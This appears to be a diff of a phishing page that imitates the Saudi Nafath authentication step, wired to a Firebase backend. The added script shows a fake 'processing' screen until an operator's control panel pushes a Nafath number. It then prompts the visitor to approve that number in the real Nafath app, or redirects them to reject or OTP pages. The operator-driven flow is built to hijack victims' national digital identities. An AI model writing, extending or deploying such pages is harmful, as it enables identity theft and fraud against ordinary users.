@@ -2,48 +2,78 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>توثيق نفاذ</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نفاذ | جاري التوثيق</title>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
     <style>
-        /* ستايل شاشة التحميل الخضراء */
-        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; }
-        .loader { width: 80%; height: 10px; background: #eee; border-radius: 5px; overflow: hidden; margin-bottom: 10px; }
-        .progress { width: 60%; height: 100%; background: #00ff9d; animation: load 2s infinite; }
-        @keyframes load { 0% { transform: translateX(-100%); } 100% { transform: translateX(150%); } }
-        #code-display { display: none; text-align: center; margin-top: 50px; }
-        .big-num { font-size: 80px; font-weight: bold; color: #17a2b8; }
+        body { font-family: sans-serif; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        #loading-screen { text-align: center; }
+        .loader-bar { width: 250px; height: 5px; background: #e0e0e0; border-radius: 10px; overflow: hidden; margin: 20px auto; }
+        .progress { width: 40%; height: 100%; background: #00c853; animation: slide 1.5s infinite; }
+        @keyframes slide { 0% { transform: translateX(-100%); } 100% { transform: translateX(250%); } }
+        
+        #code-screen { display: none; text-align: center; background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 80%; }
+        .number-circle { font-size: 80px; font-weight: bold; color: #007bff; margin: 20px 0; }
     </style>
 </head>
 <body>
 
-<div id="overlay">
-    <div class="loader"><div class="progress"></div></div>
-    <p>جاري المعالجة، نرجو الانتظار...</p>
-</div>
+    <div id="loading-screen">
+        <div class="loader-bar"><div class="progress"></div></div>
+        <p>جاري المعالجة، نرجو الانتظار...</p>
+    </div>
 
-<div id="code-display">
-    <h2>الرجاء تأكيد الطلب عبر تطبيق نفاذ باختيار الرقم:</h2>
-    <div class="big-num" id="target-number">--</div>
-</div>
+    <div id="code-screen">
+        <h3>الرجاء اختيار الرقم التالي في تطبيق نفاذ:</h3>
+        <div class="number-circle" id="display-num">--</div>
+        <p>بانتظار تأكيدك للطلب من التطبيق...</p>
+    </div>
 
 <script>
-    // استخدم نفس الـ firebaseConfig هنا
+    // إعدادات Firebase
+    const firebaseConfig = {
+        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
+        authDomain: "tameen-658e9.firebaseapp.com",
+        projectId: "tameen-658e9",
+        storageBucket: "tameen-658e9.firebasestorage.app",
+        messagingSenderId: "292670676256",
+        appId: "1:292670676256:web:3624157751cd194efe4b45"
+    };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
+
+    // جلب الـ ID المحفوظ
     const userId = localStorage.getItem('user_id');
 
     if (userId) {
+        // مراقبة الطلب لحظة بلحظة
         db.collection("orders").doc(userId).onSnapshot((doc) => {
-            const data = doc.data();
-            if (data.next_step === "SHOW_NAFATH_CODE") {
-                document.getElementById('overlay').style.display = 'none';
-                document.getElementById('code-display').style.display = 'block';
-                document.getElementById('target-number').innerText = data.nafath_code;
+            if (doc.exists) {
+                const data = doc.data();
+
+                // إذا أرسلت رقم نفاذ من لوحة التحكم
+                if (data.next_step === "SHOW_NAFATH_CODE" && data.nafath_code) {
+                    document.getElementById('loading-screen').style.display = 'none';
+                    document.getElementById('code-screen').style.display = 'block';
+                    document.getElementById('display-num').innerText = data.nafath_code;
+                }
+
+                // إذا ضغطت "رفض" في لوحة التحكم
+                if (data.next_step === "GO_TO_REJECT") {
+                    alert("نعتذر، تم رفض الطلب.");
+                    window.location.href = "index.html";
+                }
+
+                // إذا ضغطت "طلب كود OTP"
+                if (data.next_step === "GO_TO_OTP") {
+                    window.location.href = "otp.html";
+                }
             }
-            if (data.next_step === "GO_TO_REJECT") { window.location.href = "index.html"; alert("نعتذر، تم رفض الطلب"); }
-            if (data.next_step === "SUCCESS") { window.location.href = "success.html"; }
         });
+    } else {
+        // إذا دخل الصفحة بدون تسجيل بيانات يرجعه للرئيسية
+        window.location.href = "index.html";
     }
 </script>
 </body>
